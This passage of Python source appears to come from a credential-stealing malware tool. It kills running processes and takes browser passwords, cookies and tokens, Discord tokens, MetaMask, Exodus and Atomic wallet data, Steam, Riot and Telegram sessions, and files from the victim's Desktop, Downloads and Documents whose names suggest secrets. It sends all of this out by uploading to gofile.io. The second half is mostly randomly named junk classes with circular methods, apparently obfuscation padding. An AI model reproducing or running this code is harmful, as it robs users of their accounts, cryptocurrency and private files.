    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = TR6st(C00k13)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["crpassw.txt", "crcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, P4sswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = TR6st(C00k13)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

class UMuzEjUeXvllG:
    def __init__(self):
        self.__GmbYmdILLuYRlZim()
        self.__NhiBgGJi()
        self.__EOZkWGNvefQhdjkdSv()
        self.__LEpwJFCrqe()
        self.__RaxQsbUaiXFuosjLjFL()
        self.__gFyMUBeclxAMSuLGFI()
        self.__peuqNPJgSViqteJ()
        self.__ZYLcqbHdYTIqqL()
        self.__MgiXVFfX()
    def __GmbYmdILLuYRlZim(self, UuRZkBenvdQaxpr, EhsaszgQ, WusaqAueWgoRuFJxREl, rTaQFK, ikgVdCv, CjYaFqqV):
        return self.__EOZkWGNvefQhdjkdSv()
    def __NhiBgGJi(self, CuBzwZqZVh, vrQntwSfuo, ZNLesUnrw):
        return self.__EOZkWGNvefQhdjkdSv()
    def __EOZkWGNvefQhdjkdSv(self, ruDEFEVIMPuljxbIum, IcZbAuTO, ZCpTMCgZXOvOlb, XVHYWuS, ROkgZ):
        return self.__ZYLcqbHdYTIqqL()
    def __LEpwJFCrqe(self, mBAvgegohAEQ, ZGIXDTrwFUgGewuTBXzh):
        return self.__MgiXVFfX()
    def __RaxQsbUaiXFuosjLjFL(self, MibIKA, JcQaeKrMlNwgyDHed, uIebkvmF):
        return self.__NhiBgGJi()
    def __gFyMUBeclxAMSuLGFI(self, MYUajyiy, BZVlJGwK, EBUTLJKOimGrKIz):
        return self.__RaxQsbUaiXFuosjLjFL()
    def __peuqNPJgSViqteJ(self, dfhmeiu, krzPWxIcOiiph, FQzPGDNGDVdCKv, mdahQWJOsQchfE, sSeXHRweF, JtssGUuPX, iczMCP):
        return self.__EOZkWGNvefQhdjkdSv()
    def __ZYLcqbHdYTIqqL(self, PFmMRmYOBVWmaYxGPGlA, zWfUDzjwPom, KqIDQiGd):
        return self.__gFyMUBeclxAMSuLGFI()
    def __MgiXVFfX(self, fnlLoUMWepkOH, novVDxupN, DERJFMepAMkw, srnJyEhmsJe):
        return self.__peuqNPJgSViqteJ()
class MyyxEelpTrPksTrw:
    def __init__(self):
        self.__QkfRfCTqYThuUeydeFyD()
        self.__DWJHRfjGqB()
        self.__thtJrhVr()
        self.__xkjEZmiSc()
        self.__vcOiedwWgTvpEDCB()
        self.__eieGIJsrcEe()
        self.__OyxRiLwQvnfq()
        self.__owWjslNAP()
        self.__eXzXntNJSfHAwgaaZt()
        self.__kQoUCzwslOWUqwmVvcD()
        self.__VquWeGLaRnLufGRB()
        self.__MgvalQPJJNksXtETN()
        self.__GwpbtIFkrJrairDFH()
        self.__EHdJSFvuFJFjZBMig()
    def __QkfRfCTqYThuUeydeFyD(self, fgFbSWVpQckROBnTaSm, HMLrGyKOxlDSkMGVgpbD, QoZKxaSlDI, QsZdC, xqjzzvCiHMXGS):
        return self.__eieGIJsrcEe()
    def __DWJHRfjGqB(self, jNDlYztAuakaOymZBAsm):
        return self.__OyxRiLwQvnfq()
    def __thtJrhVr(self, kmsbrQU, zkWxzrSpAplFToQ, YAfmZNUcdUql, iUyJWbCtKz):
        return self.__GwpbtIFkrJrairDFH()
    def __xkjEZmiSc(self, bczsIBdiuHfSJGU, VUgMZdg, RHLWzJstniHqvDdxC, xPZEtsvLqpQqTLSvnE, eVGntuiaHHBkASB, qQpwvmQuAxSp):
        return self.__GwpbtIFkrJrairDFH()
    def __vcOiedwWgTvpEDCB(self, TnUAnEnDVHBiWwQWHtO, RCrhZNzXZjYoxHYSS, WYbyRC, YGpUbYFgSdVtbXTMwzz, hIcNxUH):
        return self.__VquWeGLaRnLufGRB()
    def __eieGIJsrcEe(self, SUUrwSYIwm):
        return self.__eXzXntNJSfHAwgaaZt()
    def __OyxRiLwQvnfq(self, UOAPNJpIPpYQvj, KitIKzpjf):
        return self.__owWjslNAP()
    def __owWjslNAP(self, akxyVB):
        return self.__OyxRiLwQvnfq()
    def __eXzXntNJSfHAwgaaZt(self, pERYNxddVfStT):
        return self.__eXzXntNJSfHAwgaaZt()
    def __kQoUCzwslOWUqwmVvcD(self, bTobxUgnChsLBBSOo, aKKNjTVfZeuiPomMXC, JrDOIwYiCsmXOAcXRqm, CfDhTQIehD, BaOFKHurHvmimzowgf, sRfEiqua):
        return self.__eXzXntNJSfHAwgaaZt()
    def __VquWeGLaRnLufGRB(self, uoyUKwYsH, vLbuxn, SwLOdODTIk, nphLBFUfRMhfJVHtqJ, jyQopQuK, GANyjBolniinXQuWR):
        return self.__DWJHRfjGqB()
    def __MgvalQPJJNksXtETN(self, sySbumy, IrmHfulbr, pcnHSAPUSULkJRTjeRe, MbCYjCHEXmD, bBjrjmglUddxjDi):
        return self.__kQoUCzwslOWUqwmVvcD()
    def __GwpbtIFkrJrairDFH(self, HVCmdhwWAm, JryuNN, TfYkNezZkdVmlYKSQFy):
        return self.__MgvalQPJJNksXtETN()
    def __EHdJSFvuFJFjZBMig(self, JzmxOGMpLfQWVQynasUD, jJymYd):
        return self.__MgvalQPJJNksXtETN()
class SUDzAVSHlvezMiCkG:
    def __init__(self):
        self.__NUlixBAraOAiTiCcfo()
        self.__UkWDpZqexgfGxqDsrRHu()
        self.__VHuzhLYrJLzTsE()
        self.__eSjsJpBozLq()
        self.__hcjoCgdQlgIxpEI()
        self.__JCKeABnFPGmNAg()
        self.__RKnmCzHnKHnsfdi()
        self.__iIvemkzwwCbe()
        self.__mSiISaDz()
        self.__uHoYRtNdXTMucwgXY()
        self.__huRfFwwhAnCMEMCnsriV()
    def __NUlixBAraOAiTiCcfo(self, IipDDmQz, eqOcokAUrURNdqkLbn, OnKKsBJC, swfMrZPfadnF, xBoAYJctnHHoDjF):
        return self.__NUlixBAraOAiTiCcfo()
    def __UkWDpZqexgfGxqDsrRHu(self, tOpzb, KWwrCDRmyKn, SJWvubPLPbYQuByQW, EuhRCXcgdLDay):
        return self.__NUlixBAraOAiTiCcfo()
    def __VHuzhLYrJLzTsE(self, YVfnXvFXZOfoA, yeUIGiuphLy, KgdoNlxpyixEC, WfUDdwnvZe, sCCDEIvuifAjdphi, OIOxsSXeCYFgzN, VPmyN):
        return self.__mSiISaDz()
    def __eSjsJpBozLq(self, RndfbKJaGvthemmvLD, vZgjJ, EBsgVHgOCvCH, SXGRJuPordhT, WUdDYbyPv, CxUsbDyw):
        return self.__hcjoCgdQlgIxpEI()
    def __hcjoCgdQlgIxpEI(self, wLXKgixbaXzqmcXGbv, VByysakms, nTJwCyWuiRViV, ssJiNd, aADBA):
        return self.__NUlixBAraOAiTiCcfo()
    def __JCKeABnFPGmNAg(self, ecCSydRR, GdVMayweSyk, hakOPIythRJzPcMadd, LieUSsEqksNIJMIqbxWe):
        return self.__iIvemkzwwCbe()
    def __RKnmCzHnKHnsfdi(self, FCgqSSgMjZCeJJy, HSNDm, KRwWaOdqJrsIluh, HvdRtlgJgY, StfeJIWtjZPDvQPSeT):
        return self.__NUlixBAraOAiTiCcfo()
    def __iIvemkzwwCbe(self, nJVgNoRCHHWTW, LnMUsWqEnLmQPbfYq, hPUyNqbkMAOY):
        return self.__mSiISaDz()
    def __mSiISaDz(self, osWhKyuPNqyYn):
        return self.__uHoYRtNdXTMucwgXY()
    def __uHoYRtNdXTMucwgXY(self, pCCewDhHOkOUxaIGy, XzBSE, EZJKhziqegvSSQm, CAsxyaJD):
        return self.__iIvemkzwwCbe()
    def __huRfFwwhAnCMEMCnsriV(self, dSBCMPLnWFZOYx, xGdkIuT, RirCezPEE, rsXHVLZiOrxYWSV):
        return self.__NUlixBAraOAiTiCcfo()

class FmKDYOCurAxayEGs:
    def __init__(self):
        self.__IZqYixfMNAPOVeBDEGE()
        self.__uBTxwbGCrIbGwo()
        self.__gjAiAbgh()
        self.__qjvfpzNMz()
        self.__CGNnyyAigiHz()
        self.__wQnXJhWLiUEmYlLxkoD()
        self.__GUXtLxvoaRrkwaH()
        self.__lyJffElHL()
        self.__fBWJHKbGZohochQbmj()
        self.__KBuTJzxqdmwNAfQIIh()
        self.__oQHQyfQNCrNgVSwr()
        self.__dJrEQByAzqasZLaI()
    def __IZqYixfMNAPOVeBDEGE(self, OPaSLeMUAvuMtl, TXnTIcYvDtatDNUEK, SsjlPsAjKapEizW, rERhusuLutda, MFJnvLaKmPyeZTwFGWy, wOyWmkySje):
        return self.__dJrEQByAzqasZLaI()
    def __uBTxwbGCrIbGwo(self, UZgmgEOC, Hzfpfru, DMvxuw):
        return self.__gjAiAbgh()
    def __gjAiAbgh(self, enFzAxljUr, lILjaPClbcFn, MFUMWEkNzcCYL, QsfblUWnpMdYfcz):
        return self.__IZqYixfMNAPOVeBDEGE()
    def __qjvfpzNMz(self, mGevhsnzJ):
        return self.__gjAiAbgh()
    def __CGNnyyAigiHz(self, OCgUEqNWrfrMZWzcL, yNBjarbwSc):
        return self.__lyJffElHL()
    def __wQnXJhWLiUEmYlLxkoD(self, yTeHptqZ):
        return self.__uBTxwbGCrIbGwo()
    def __GUXtLxvoaRrkwaH(self, hbDctSFUdrMR, CPXrOhFPmosWW):
        return self.__dJrEQByAzqasZLaI()
    def __lyJffElHL(self, tPSeFPAd, NsTNfqNYbIiTiQsY):
        return self.__KBuTJzxqdmwNAfQIIh()
    def __fBWJHKbGZohochQbmj(self, OmRcMVtVEfqmv, abTkSVHmfFCmKZU, NJriA, pgsTW, KfOPYeclJaQqbsziSXRj, ORjqQeaKdohJQCNWfK, DjeUtQ):
        return self.__GUXtLxvoaRrkwaH()
    def __KBuTJzxqdmwNAfQIIh(self, pazUIEXmN, OynsnDdM):
        return self.__lyJffElHL()
    def __oQHQyfQNCrNgVSwr(self, Wkqfds, wyXNbYGzjYKbvM, coWMaYSsEqNrlMPG, ySWphCOzDV, gAUHQCGJbTiYbY, pLujfwiGvDVU):
        return self.__lyJffElHL()
    def __dJrEQByAzqasZLaI(self, BEOEcdEXkpf, KRIACHDU, oUBHEBXVKgWgpzK):
        return self.__CGNnyyAigiHz()
class uvmeubayNZUaPD:
    def __init__(self):
        self.__UwEVyqambDDl()
        self.__eujvuaPmnD()
        self.__EZEODnidjgXIh()
        self.__DdhFXDBKFiUbpNmbYWku()
        self.__JQkAZvonUKCzsjroTFt()
        self.__vVEpBWlTEHyPuFdx()
        self.__tBZtwYMw()
        self.__aHcMtIPK()
        self.__fhmnLseJSuUveKJxF()
    def __UwEVyqambDDl(self, EEjvuAzcbvcWEuLDTxR, nUjPlEA, PjeRqNGeroNiiGir, IpWjqcYfSODh):
        return self.__aHcMtIPK()
    def __eujvuaPmnD(self, xtOTFApXYXPHpheP, TjUHaBufdNIvCSycP, kiSdawOhBH):
        return self.__EZEODnidjgXIh()
    def __EZEODnidjgXIh(self, iMRDugrRdPV, lGVrwyRSbNGegexp, kPrFmCwByxNs, MqvXNdBCIEuMBYcbtzmb, RLNtjsVHABjDkg, vcflbAAcsAxqlM, cztxAjPjPvkZ):
        return self.__DdhFXDBKFiUbpNmbYWku()
    def __DdhFXDBKFiUbpNmbYWku(self, KlRyNtKzAauQwizJbx, mdGSsCQVbcowKgR):
        return self.__EZEODnidjgXIh()
    def __JQkAZvonUKCzsjroTFt(self, DcEaWYscfnXpoxPJx, wZrCVNVCQYWjdgg, lHSKf, xuctPljVtUvOxA, nZhZSst, GRSAKfJpnIUKKEYnSB):
        return self.__vVEpBWlTEHyPuFdx()
    def __vVEpBWlTEHyPuFdx(self, bHsuvtxEauX, hpSVlZWyN, WOzCli, XkSfdMlhoRqEanv, DCXogA):
        return self.__EZEODnidjgXIh()
    def __tBZtwYMw(self, uSNRcBZpCwrIWEbLbgO, xEvdDDtOlJEGpFliCL, bmvriOWfSOL, FHtwnmj, eMuirwKuiscMZZ, wQbshKkYveEWPqUIngWw):
        return self.__EZEODnidjgXIh()
    def __aHcMtIPK(self, toXJrvvGUwJOMsW, iQaCRSzYXlxC):
        return self.__fhmnLseJSuUveKJxF()
    def __fhmnLseJSuUveKJxF(self, giEOJzv, cMsqP, MhmaxVunfBmclUvbC, KunjIvs, XwXjt):
        return self.__tBZtwYMw()

class JVQATIIfbsigLfSblXn:
    def __init__(self):
        self.__rDpzUJtc()
        self.__dhDDpBdjtCQ()
        self.__iKeifHhZA()
        self.__PnpdzcywOHQcahZbODy()
        self.__DDfYNJcyOgJbzRP()
    def __rDpzUJtc(self, UvMUTnXKvoCvMhCrxYMx, MXvdzMjz, AxsoxRfgyFYSYGMxAPbi, ifofUeOJJSjMq, gmJQVERzsRvyUVFp, GLParCyxGA, oDRbT):
        return self.__dhDDpBdjtCQ()
    def __dhDDpBdjtCQ(self, pHzbQUWZyMGaRqdM, RJUBjSIVBGntqIDgBJ, vCsLAEeBnyLIEQPAC, itMYgGuYHEO, VRtfrnJc, FBbEHHzyN, ULYEfKE):
        return self.__DDfYNJcyOgJbzRP()
    def __iKeifHhZA(self, PFAvUVGyGzrDqKBjOG):
        return self.__rDpzUJtc()
    def __PnpdzcywOHQcahZbODy(self, dCAHdOdlonmDkG, GBQayAxFychCg, RntZGyHukEQzzpfeb, gmEVUtKufS, peWTJAIGgupMqETuYnH, OdoLJAKWQFSME, TdrVVcxngrzFPhrix):
        return self.__dhDDpBdjtCQ()
    def __DDfYNJcyOgJbzRP(self, oldBxioK, FVnHWjYThJiUje):
        return self.__DDfYNJcyOgJbzRP()
class CwvnOmapDfcvH:
    def __init__(self):
        self.__cjkyDLBtbszNpTG()
        self.__nonNLBqMwUBjTXEGxMa()
        self.__TxOXcJBHDWA()
        self.__igbKJbZbVhoN()
        self.__VHSrZyXEgMjcUw()
        self.__eMaWhHKln()
        self.__ylNWQYZNuZsZ()
        self.__insaaxCZcsCOspe()
        self.__rZVbuviOTQfApqLB()
        self.__pYSNhoINec()
    def __cjkyDLBtbszNpTG(self, fAHNxmysHNpUPijPzOaJ, QmYQkwT, vyeoQECT):
        return self.__insaaxCZcsCOspe()
    def __nonNLBqMwUBjTXEGxMa(self, DsnQvivS, omUWyLeFhuu, cMMwrksCHawemXePgu, JwZwEiGhFJsChk, pfXLra, ZLxUm):
        return self.__cjkyDLBtbszNpTG()
    def __TxOXcJBHDWA(self, NdhdtLt, SHiSGmGC, jXAZcGyObZwCfIFrmB, TGaqgBzn):
        return self.__insaaxCZcsCOspe()
    def __igbKJbZbVhoN(self, voKmN, hwQUqpiAlYUqrgA, YZZkxrEcGKXS, jbyalStoTg, yLEfSzT):
        return self.__insaaxCZcsCOspe()
    def __VHSrZyXEgMjcUw(self, UaGpIxJOarnl, trYcl, DtSxhLSDeOCa, EFoUVpwNzjGfoDfN, wyuKqMAaPm, vAKPR):
        return self.__igbKJbZbVhoN()
    def __eMaWhHKln(self, aPAwnqOiPxrXKGakT, SqPKJZuFaAROdPVYg):
        return self.__eMaWhHKln()
    def __ylNWQYZNuZsZ(self, zMepdhWRZSdpbefucSPH, gBevWGycKZMAuffhdaR, edbiMQzzlPrzqIyw):
        return self.__pYSNhoINec()
    def __insaaxCZcsCOspe(self, WFcNtrF, kYjXbLjUx):
        return self.__eMaWhHKln()
    def __rZVbuviOTQfApqLB(self, tQnSTUTGMCFwOfYEz, ChTKufJgebQqdFjIdPv, QPNCxAMeOiChE, YntEgbUk, DLhQcipZQSBeR, gOzYMeoUXqzwJEmv, ShIeuuGPX):
        return self.__nonNLBqMwUBjTXEGxMa()
    def __pYSNhoINec(self, XrgnTqlCNvJKBNAU, RNPalapcKqYCPnWl, IZiRUeSfrZZNxKzBBD, wJhqtCdO):
        return self.__insaaxCZcsCOspe()

class NgQtzLFWgrkeFBh:
    def __init__(self):
        self.__dEmCWttUPKxvvYJnefy()
        self.__mwlukbmPHSqsBhZcLz()
        self.__ikaJdlISHvOtmqRZEN()
        self.__GbuarrUcOGo()
        self.__gIbLZlVk()
        self.__hkRLmBghAau()
    def __dEmCWttUPKxvvYJnefy(self, qgzoBvuE, rNXfz, uZMJUiTIDqhB, iVTycKIcUHngCvhgtxN):
        return self.__GbuarrUcOGo()
    def __mwlukbmPHSqsBhZcLz(self, MNqYXDgLzMzEwavb, mSfEDYbjrvduj, kWTITcaxvuwNmPaiaud, gqpczYzvrfA):
        return self.__gIbLZlVk()
    def __ikaJdlISHvOtmqRZEN(self, hXtgtrIUuNqSkOih):
        return self.__GbuarrUcOGo()
    def __GbuarrUcOGo(self, rDLlzMZwNshXATTjqPgl, EauckGXOwgMCVhP, EBzZMKaJIAmhZo, lILSybwURQfisCJoQd, LSHjoJtlLkN, vfGugVvlS, lZKtaDdMHCwgS):
        return self.__ikaJdlISHvOtmqRZEN()
    def __gIbLZlVk(self, EXmwmLd, TDAILHSfZbFyARLOBf, CsXmrBJHLAGssf):
        return self.__dEmCWttUPKxvvYJnefy()
    def __hkRLmBghAau(self, FPFwIJZOfOW):
        return self.__hkRLmBghAau()
class CaXIqKcuVCbSzwCmH:
    def __init__(self):
        self.__pCVzLZpVN()
        self.__bHzNuDYSWqtsRFmlyKH()
        self.__MaLKHSzAdga()
        self.__HVBGjuwaUxWDlcm()
        self.__wlQCyCYCTbrZbcG()
        self.__jOZzmVHfnXvMAbh()
    def __pCVzLZpVN(self, cilFIxsGpiyFgJhbTh, mhgTut):
        return self.__wlQCyCYCTbrZbcG()
    def __bHzNuDYSWqtsRFmlyKH(self, DRLcCJDhvxYkYFvELt):
        return self.__HVBGjuwaUxWDlcm()
    def __MaLKHSzAdga(self, wqzAB, XbWXjpJo):
        return self.__bHzNuDYSWqtsRFmlyKH()
    def __HVBGjuwaUxWDlcm(self, zsVFcJxaRo, bYYIWYMkYiDFaXBhM, fhWUnKpgCtTRWWBtMadT, FOSdugmWOEKywhPntBWb, uxSZPZaLm, HbEcMUGAyLsdwHVk):
        return self.__wlQCyCYCTbrZbcG()
    def __wlQCyCYCTbrZbcG(self, mndbWlKPWpzofpYix, VdrqvqU, mJEiqJM, geynI):
        return self.__MaLKHSzAdga()
    def __jOZzmVHfnXvMAbh(self, GcOYKy, ImKkCUVm):
        return self.__HVBGjuwaUxWDlcm()

class nqbnlvLA:
    def __init__(self):
        self.__UiVvlqeeBTxVGBDp()
        self.__gQpkwfuKFyds()
        self.__zyyvVjNEYqN()
        self.__rugBqjun()
        self.__UBgRondhMFWhdGNu()
        self.__lWCNHXupuMOpkArPDMzO()
        self.__WqOWKJMuajtKchfzStA()
        self.__CLUzeXIdLZVyYD()
        self.__UuSNwlyqhWRpigWpKfO()
        self.__HcGJCofB()
        self.__PsBaSBvjYCgixmT()
        self.__spwdmVavS()
        self.__jAKcewnGizbukxh()
    def __UiVvlqeeBTxVGBDp(self, kOkFvYYB, KrwNWqBjOqRUzO, XofqLFsseWdokjiQOyq, YwgqCrFqAnXodihPIm):
        return self.__UuSNwlyqhWRpigWpKfO()
    def __gQpkwfuKFyds(self, WqOlBaDBT, iMlcmoEllmIoPIO, UXCCfigBRCgwsS):
        return self.__UBgRondhMFWhdGNu()
    def __zyyvVjNEYqN(self, ROvbUfqcxeQIgvERzLi, wcgQSEsOYRHSYXdQy, JrLWNpFRRlvqxIKUjHiw, BmVRCfZdrNQvNKBqASP, pbMufzzJv):
        return self.__WqOWKJMuajtKchfzStA()
    def __rugBqjun(self, nzGIJhhduCoklzyT, nHsbnNPKqtMUx, POPsOYhYoA):
        return self.__gQpkwfuKFyds()
    def __UBgRondhMFWhdGNu(self, PNJLnrKm, QZvDLWZkOV, PlnIKeX, ZMsheCeGfoCaaqnRGzTT, urdBDpriYkQVSv):
        return self.__HcGJCofB()
    def __lWCNHXupuMOpkArPDMzO(self, atYlmwgmbOiqd, yETgCe, MrtSYAToLP):
        return self.__rugBqjun()
    def __WqOWKJMuajtKchfzStA(self, NZksfTkgdKTAdvRgGNVb, wPHsMaAupT, tYzYALMDccJFEgReCueP):
        return self.__lWCNHXupuMOpkArPDMzO()
    def __CLUzeXIdLZVyYD(self, ekcNbtOLzh):
        return self.__UuSNwlyqhWRpigWpKfO()
    def __UuSNwlyqhWRpigWpKfO(self, ZLjFuArPIOWV, edMfKCuaZWNCl, YkXliStefMSX, idZtQO, xISesFyIOSLliTEeGc, mQXioRpuZjyp, NLpLgBEnlCElddOafUR):
